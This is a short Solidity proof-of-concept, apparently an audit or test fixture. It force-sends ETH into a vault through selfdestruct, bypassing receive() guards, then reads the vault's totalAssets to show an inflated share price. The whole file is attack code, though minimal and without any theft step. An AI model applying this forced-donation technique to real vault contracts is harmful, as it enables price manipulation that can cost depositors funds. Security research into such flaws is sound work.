
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function balanceOf(address) external view returns (uint256);
    function totalAssets() external view returns (uint256);
}

contract ForceSender {
    // Force-send ETH to the vault — bypasses receive() guards
    function forceSend(address target) external payable {
        selfdestruct(payable(target));
    }
}

contract ForceSendBreak {
    IVault public vault;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    // After the force-send, share price is inflated
    function exploit() external view returns (uint256 inflatedPrice) {
        return vault.totalAssets() * 1e18 / (vault.balanceOf(address(this)) + 1);
    }
}
